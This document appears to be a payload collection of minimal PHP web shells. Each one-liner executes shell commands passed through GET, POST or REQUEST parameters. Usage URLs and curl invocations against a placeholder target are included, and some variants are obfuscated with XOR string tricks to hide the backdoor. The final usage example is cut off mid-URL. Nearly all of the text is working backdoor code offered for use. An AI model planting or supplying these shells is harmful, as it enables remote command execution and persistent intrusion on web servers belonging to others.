?=`$_GET[0]`?>

Usage :
  http://target.com/path/to/shell.php?0=command
<?=`$_POST[0]`?>

Usage :
  curl -X POST http://target.com/path/to/shell.php -d "0=command"
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>

Usage : 
  http://target.com/path/to/shell.php?0=command
 
Note :
  Obfuscation of <?=`$_GET[0]`?>
<?=`{$_REQUEST['_']}`?>

Usage :
 - http://target.com/path/to/shell.php?_=command
 - curl -X POST http://target.com/path/to/shell.php -d "_=command"

Note :
  Accept GET and POST method
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>

Usage :
  http://target.com/path/to/shell.php?_=function&__=argument
  
  Ex :
    http://target.com/path/to/shell
